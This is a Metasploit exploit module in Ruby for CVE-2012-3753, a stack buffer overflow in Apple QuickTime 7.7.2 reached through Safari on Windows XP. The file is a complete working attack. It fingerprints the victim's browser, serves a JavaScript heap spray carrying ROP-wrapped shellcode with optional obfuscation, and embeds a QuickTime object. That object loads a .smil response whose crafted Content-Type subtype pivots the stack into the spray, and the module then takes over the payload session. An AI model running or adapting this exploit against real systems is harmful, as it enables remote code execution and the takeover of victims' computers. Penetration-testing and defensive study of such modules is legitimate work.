# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::Egghunter
    include Msf::Exploit::RopDb
 
    include Msf::Exploit::Remote::BrowserAutopwn
    autopwn_info({
        :os_name    => OperatingSystems::WINDOWS,
        :ua_name    => HttpClients::SAFARI,
        :ua_maxver  => &#039;5.0.1&#039;,
        :ua_maxver  => &#039;5.1.7&#039;,
        :javascript => true,
        :rank       => NormalRanking, # reliable memory corruption
        :vuln_test  => nil
    })
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Apple QuickTime 7.7.2 MIME Type Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow in Apple QuickTime 7.7.2. The stack
                based overflow occurs when processing a malformed Content-Type header. The module
                has been tested successfully on Safari 5.1.7 and 5.0.7 on Windows XP SP3.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Pavel Polischouk&#039;, # Vulnerability discovery
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-3753&#039; ],
                    [ &#039;OSVDB&#039;, &#039;87088&#039;],
                    [ &#039;BID&#039;, &#039;56438&#039; ],
                    [ &#039;URL&#039;, &#039;http://support.apple.com/kb/HT5581&#039; ],
                    [ &#039;URL&#039;, &#039;http://asintsov.blogspot.com.es/2012/11/heapspray.html&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;  =>
                [
                    # Tested with QuickTime 7.7.2
                    [ &#039;Automatic&#039;, {} ],
                    [ &#039;Windows XP SP3 / Safari 5.1.7 / Apple QuickTime Player 7.7.2&#039;,
                        {
                            &#039;OffsetFirstStackPivot&#039; => 389,
                            &#039;OffsetSecondStackPivot&#039; => 105,
                            &#039;FirstStackPivot&#039; => 0x671a230b, # ADD ESP,4B8 # RETN # Quicktime.qts,
                            &#039;SecondStackPivot&#039; => 0x67123437, # pop esp / ret # Quicktime.qts
                            &#039;SprayOffset&#039; => 264,
                            &#039;SprayedAddress&#039; => 0x60130124
                        }
                    ],
                    [ &#039;Windows XP SP3 / Safari 5.0.5 / Apple QuickTime Player 7.7.2&#039;,
                        {
                            &#039;OffsetFirstStackPivot&#039; => 389,
                            &#039;OffsetSecondStackPivot&#039; => 105,
                            &#039;FirstStackPivot&#039; => 0x671a230b, # ADD ESP,4B8 # RETN # Quicktime.qts,
                            &#039;SecondStackPivot&#039; => 0x67123437, # pop esp / ret # Quicktime.qts
                            &#039;SprayOffset&#039; => 264,
                            &#039;SprayedAddress&#039; => 0x60130124
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Nov 07 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
            ], self.class
        )
    end
 
    def get_target(agent)
        #If the user is already specified by the user, we&#039;ll just use that
        return target if target.name != &#039;Automatic&#039;
 
        nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || &#039;&#039;
 
        browser_name = ""
        if agent =~ /Safari/ and agent=~ /Version\/5\.1\.7/
            browser_name = "Safari 5.1.7"
        elsif agent =~ /Safari/ and agent=~ /Version\/5\.0\.5/
            browser_name = "Safari 5.0.5"
        end
 
        os_name = &#039;Windows XP SP3&#039;
 
        targets.each do |t|
            if (!browser_name.empty? and t.name.include?(browser_name)) and (!nt.empty? and t.name.include?(os_name))
                print_status("Target selected as: #{t.name}")
                return t
            end
        end
 
        return nil
    end
 
    def on_request_uri(client, request)
 
        agent = request.headers[&#039;User-Agent&#039;]
        my_target = get_target(agent)
 
        # Avoid the attack if the victim doesn&#039;t have the same setup we&#039;re targeting
        if my_target.nil?
            print_error("Browser not supported: #{agent}")
            send_not_found(cli)
            return
        end
 
        return if ((p = regenerate_payload(client)) == nil)
 
        if request.uri =~ /\.smil$/
            print_status("Sending exploit (target: #{my_target.name})")
            smil = rand_text_alpha(20)
            type = rand_text_alpha_lower(1)
            subtype = rand_text_alpha_lower(my_target[&#039;OffsetSecondStackPivot&#039;])
            subtype << [my_target[&#039;SecondStackPivot&#039;]].pack("V")
            subtype << [my_target[&#039;SprayedAddress&#039;]].pack("V")
            subtype << rand_text_alpha_lower(my_target[&#039;OffsetFirstStackPivot&#039;] - subtype.length)
            subtype << rand_text_alpha_lower(4)
            subtype << [my_target[&#039;FirstStackPivot&#039;]].pack("V")
            subtype << rand_text_alpha_lower(10000 - subtype.length)
            send_response(client, smil, { &#039;Content-Type&#039; => "#{type}/#{subtype}" })
        else
            print_status("Sending initial HTML")
            url =  ((datastore[&#039;SSL&#039;]) ? "https://" : "http://")
            url << ((datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(client.peerhost) : datastore[&#039;SRVHOST&#039;])
            url << ":" + datastore[&#039;SRVPORT&#039;].to_s
            url << get_resource
            fname = rand_text_alphanumeric(4)
 
            code = generate_rop_payload(&#039;msvcrt&#039;, payload.encoded, {&#039;target&#039;=>&#039;xp&#039;})
            js_code = Rex::Text.to_unescape(code, Rex::Arch.endian(my_target.arch))
            offset = rand_text(my_target[&#039;SprayOffset&#039;])
            js_offset = Rex::Text.to_unescape(offset, Rex::Arch.endian(my_target.arch))
            fill = rand_text(4)
            js_fill = Rex::Text.to_unescape(fill, Rex::Arch.endian(my_target.arch))
 
            # Heap Spray based on http://asintsov.blogspot.com.es/2012/11/heapspray.html
            js = <<-JSSPRAY
function heapSpray(offset, shellcode, fillsled) {
    var chunk_size, headersize, fillsled_len, code;
    var i, codewithnum;
    chunk_size = 0x40000;
    headersize = 0x10;
    fillsled_len = chunk_size - (headersize + offset.length + shellcode.length);
    while (fillsled.length <fillsled_len)
        fillsled += fillsled;
    fillsled = fillsled.substring(0, fillsled_len);
    code = offset + shellcode + fillsled;
    heap_chunks = new Array();
    for (i = 0; i<1000; i++)
    {
        codewithnum = "HERE" + code;
        heap_chunks[i] = codewithnum.substring(0, codewithnum.length);
    }
}
var myoffset = unescape("#{js_offset}");
var myshellcode = unescape("#{js_code}");
var myfillsled = unescape("#{js_fill}");
heapSpray(myoffset,myshellcode,myfillsled);
            JSSPRAY
 
            if datastore[&#039;OBFUSCATE&#039;]
                js = ::Rex::Exploitation::JSObfu.new(js)
                js.obfuscate
            end
 
            content =  "<html>"
            content << "<head><script>"
            content << "#{js}"
            content << "</script></head>"
            content << "<body>"
            content << <<-ENDEMBED
<OBJECT
CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"
WIDTH="1"
HEIGHT="1"
CODEBASE="http://www.apple.com/qtactivex/qtplugin.cab">
<PARAM name="SRC"        VALUE = "#{url}/#{fname}.smil">
<PARAM name="QTSRC"      VALUE = "#{url}/#{fname}.smil">
<PARAM name="AUTOPLAY"   VALUE = "true"               >
<PARAM name="TYPE"       VALUE = "video/quicktime"    >
<PARAM name="TARGET"     VALUE = "myself"             >
<EMBED
    SRC        = "#{url}/#{fname}.smil"
    QTSRC      = "#{url}/#{fname}.smil"
    TARGET     = "myself"
    WIDTH      = "1"
    HEIGHT     = "1"
    AUTOPLAY   = "true"
    PLUGIN     = "quicktimeplugin"
    TYPE       = "video/quicktime"
    CACHE      = "false"
    PLUGINSPAGE= "http://www.apple.com/quicktime/download/" >
</EMBED>
</OBJECT>
            ENDEMBED
            content << "</body></html>"
            send_response(client, content, { &#039;Content-Type&#039; => "text/html" })
        end
 
        # Handle the payload
        handler(client)
    end
 
end

